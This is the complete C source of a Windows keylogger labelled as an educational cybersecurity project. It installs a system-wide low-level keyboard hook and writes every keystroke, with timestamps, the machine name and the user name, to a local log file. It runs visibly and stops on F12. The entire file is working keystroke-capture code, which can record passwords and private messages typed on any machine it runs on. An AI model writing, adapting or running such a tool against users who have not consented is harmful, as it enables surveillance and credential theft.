#include <windows.h>
#include <stdio.h>
#include <time.h>
#include <string.h>

#define LOG_FILE "keylog.txt"
#define MAX_SESSIONS 100

typedef struct {
    time_t start_time;
    time_t end_time;
    int key_count;
    char status[20];
} SessionInfo;

// Global variables
static int is_running = 1;
static int current_key_count = 0;
static time_t program_start_time;
HHOOK keyboard_hook;
FILE* log_file;

// Function prototypes
const char* get_key_name(DWORD vk_code);
void log_session_start(void);
void log_session_end(void);
void calculate_duration(time_t start, time_t end, char* buffer);
void print_session_summary(void);

// Function to get key name from virtual key code
const char* get_key_name(DWORD vk_code) {
    switch (vk_code) {
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_RETURN: return "[ENTER]\n";
        case VK_SHIFT: return "[SHIFT]";
        case VK_CONTROL: return "[CTRL]";
        case VK_MENU: return "[ALT]";
        case VK_CAPITAL: return "[CAPS_LOCK]";
        case VK_ESCAPE: return "[ESC]";
        case VK_SPACE: return " ";
        case VK_PRIOR: return "[PAGE_UP]";
        case VK_NEXT: return "[PAGE_DOWN]";
        case VK_END: return "[END]";
        case VK_HOME: return "[HOME]";
        case VK_LEFT: return "[LEFT]";
        case VK_UP: return "[UP]";
        case VK_RIGHT: return "[RIGHT]";
        case VK_DOWN: return "[DOWN]";
        case VK_INSERT: return "[INSERT]";
        case VK_DELETE: return "[DELETE]";
        case VK_LWIN: return "[LEFT_WIN]";
        case VK_RWIN: return "[RIGHT_WIN]";
        case VK_NUMPAD0: return "0";
        case VK_NUMPAD1: return "1";
        case VK_NUMPAD2: return "2";
        case VK_NUMPAD3: return "3";
        case VK_NUMPAD4: return "4";
        case VK_NUMPAD5: return "5";
        case VK_NUMPAD6: return "6";
        case VK_NUMPAD7: return "7";
        case VK_NUMPAD8: return "8";
        case VK_NUMPAD9: return "9";
        case VK_MULTIPLY: return "*";
        case VK_ADD: return "+";
        case VK_SEPARATOR: return "-";
        case VK_SUBTRACT: return "-";
        case VK_DECIMAL: return ".";
        case VK_DIVIDE: return "/";
        case VK_F1: return "[F1]";
        case VK_F2: return "[F2]";
        case VK_F3: return "[F3]";
        case VK_F4: return "[F4]";
        case VK_F5: return "[F5]";
        case VK_F6: return "[F6]";
        case VK_F7: return "[F7]";
        case VK_F8: return "[F8]";
        case VK_F9: return "[F9]";
        case VK_F10: return "[F10]";
        case VK_F11: return "[F11]";
        case VK_F12: return "[F12]";
        case VK_NUMLOCK: return "[NUM_LOCK]";
        case VK_SCROLL: return "[SCROLL_LOCK]";
        case VK_SNAPSHOT: return "[PRINT_SCREEN]";
        default: return NULL;
    }
}

// Calculate duration in human readable format
void calculate_duration(time_t start, time_t end, char* buffer) {
    double duration = difftime(end, start);
    int hours = (int)duration / 3600;
    int minutes = ((int)duration % 3600) / 60;
    int seconds = (int)duration % 60;
    
    if (hours > 0) {
        sprintf(buffer, "%02d:%02d:%02d", hours, minutes, seconds);
    } else {
        sprintf(buffer, "%02d:%02d", minutes, seconds);
    }
}

// Log session start information
void log_session_start(void) {
    program_start_time = time(NULL);
    
    fprintf(log_file, "\n");
    fprintf(log_file, "═══════════════════════════════════════════════════\n");
    fprintf(log_file, "🟢 KEYLOGGER SESSION STARTED\n");
    fprintf(log_file, "═══════════════════════════════════════════════════\n");
    
    char start_time[26];
    ctime_s(start_time, sizeof(start_time), &program_start_time);
    start_time[24] = '\0'; // Remove newline
    
    fprintf(log_file, "📅 Date: %s\n", start_time);
    fprintf(log_file, "🆔 Process ID: %d\n", GetCurrentProcessId());
    fprintf(log_file, "💻 Machine: %s\n", getenv("COMPUTERNAME"));
    fprintf(log_file, "👤 User: %s\n", getenv("USERNAME"));
    fprintf(log_file, "═══════════════════════════════════════════════════\n");
    fprintf(log_file, "⌨️  KEYSTROKE LOG:\n");
    fprintf(log_file, "═══════════════════════════════════════════════════\n");
    
    fflush(log_file);
}

// Log session end information
void log_session_end(void) {
    time_t end_time = time(NULL);
    
    fprintf(log_file, "═══════════════════════════════════════════════════\n");
    fprintf(log_file, "🔴 KEYLOGGER SESSION ENDED\n");
    fprintf(log_file, "═══════════════════════════════════════════════════\n");
    
    char start_time[26], end_time_str[26];
    ctime_s(start_time, sizeof(start_time), &program_start_time);
    ctime_s(end_time_str, sizeof(end_time_str), &end_time);
    start_time[24] = '\0';
    end_time_str[24] = '\0';
    
    char duration[20];
    calculate_duration(program_start_time, end_time, duration);
    
    fprintf(log_file, "📅 Start Time: %s\n", start_time);
    fprintf(log_file, "📅 End Time: %s\n", end_time_str);
    fprintf(log_file, "⏱️  Duration: %s\n", duration);
    fprintf(log_file, "🔢 Total Keystrokes: %d\n", current_key_count);
    fprintf(log_file, "📊 Average KPM: %.2f\n", 
            (current_key_count / (difftime(end_time, program_start_time) / 60.0)));
    fprintf(log_file, "═══════════════════════════════════════════════════\n\n");
    
    fflush(log_file);
}

// Keyboard hook procedure
LRESULT CALLBACK keyboard_proc(int n_code, WPARAM w_param, LPARAM l_param) {
    if (n_code >= 0 && (w_param == WM_KEYDOWN || w_param == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kbd_struct = (KBDLLHOOKSTRUCT*)l_param;
        DWORD vk_code = kbd_struct->vkCode;
        
        // Get current time with milliseconds
        SYSTEMTIME system_time;
        GetLocalTime(&system_time);
        
        // Log the key
        fprintf(log_file, "[%02d:%02d:%02d.%03d] ", 
                system_time.wHour, system_time.wMinute, 
                system_time.wSecond, system_time.wMilliseconds);
        
        const char* key_name = get_key_name(vk_code);
        if (key_name) {
            fprintf(log_file, "%s", key_name);
        } else {
            // Check for printable characters
            BYTE keyboard_state[256];
            GetKeyboardState(keyboard_state);
            
            WCHAR unicode_chars[5];
            int result = ToUnicode(vk_code, kbd_struct->scanCode, keyboard_state, 
                                 unicode_chars, 4, 0);
            
            if (result > 0) {
                unicode_chars[result] = '\0';
                fprintf(log_file, "%ls", unicode_chars);
            } else {
                fprintf(log_file, "[VK:0x%02X]", vk_code);
            }
        }
        
        current_key_count++;
        fflush(log_file);
        
        // Stop keylogger when F12 is pressed
        if (vk_code == VK_F12) {
            fprintf(log_file, "\n🛑 STOP TRIGGERED BY USER (F12)\n");
            is_running = 0;
            return 1; // Block the key
        }
    }
    
    return CallNextHookEx(keyboard_hook, n_code, w_param, l_param);
}

// Console control handler for graceful shutdown
BOOL WINAPI console_handler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        fprintf(log_file, "\n🛑 STOP TRIGGERED BY USER (Ctrl+C)\n");
        printf("\nShutting down keylogger gracefully...\n");
        is_running = 0;
        return TRUE;
    }
    return FALSE;
}

// Print session summary to console
void print_session_summary(void) {
    time_t end_time = time(NULL);
    char duration[20];
    calculate_duration(program_start_time, end_time, duration);
    
    printf("\n📊 Session Summary:\n");
    printf("══════════════════════════════════════\n");
    printf("⏱️  Duration: %s\n", duration);
    printf("🔢 Total Keystrokes: %d\n", current_key_count);
    printf("📁 Log File: %s\n", LOG_FILE);
    printf("══════════════════════════════════════\n");
}

int main() {
    printf("🔐 Educational Keylogger - Cybersecurity Project\n");
    printf("═══════════════════════════════════════════════\n");
    printf("🟢 Keylogger started. Press F12 to stop.\n");
    printf("📁 Log file: %s\n\n", LOG_FILE);
    
    // Open log file in append mode
    if (fopen_s(&log_file, LOG_FILE, "a") != 0) {
        printf("❌ Error: Could not open log file!\n");
        return 1;
    }
    
    // Log session start
    log_session_start();
    
    // Set console handler for graceful shutdown
    if (!SetConsoleCtrlHandler(console_handler, TRUE)) {
        printf("⚠️ Warning: Could not set control handler\n");
    }
    
    // Set keyboard hook
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboard_proc, GetModuleHandle(NULL), 0);
    if (!keyboard_hook) {
        printf("❌ Error: Failed to install keyboard hook!\n");
        fclose(log_file);
        return 1;
    }
    
    printf("⌨️ Keylogger is running in background...\n");
    printf("🛑 Press F12 to stop gracefully\n");
    printf("💡 Keystrokes are being logged to: %s\n", LOG_FILE);
    
    // Message loop
    MSG msg;
    while (is_running && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        Sleep(10); // Prevent high CPU usage
    }
    
    // Cleanup
    printf("\n🔄 Stopping keylogger...\n");
    
    if (keyboard_hook) {
        UnhookWindowsHookEx(keyboard_hook);
    }
    
    // Log session end
    log_session_end();
    
    fclose(log_file);
    
    // Print summary to console
    print_session_summary();
    
    printf("🔴 Keylogger stopped gracefully.\n");
    printf("📖 Check %s for complete log.\n", LOG_FILE);
    
    return 0;
}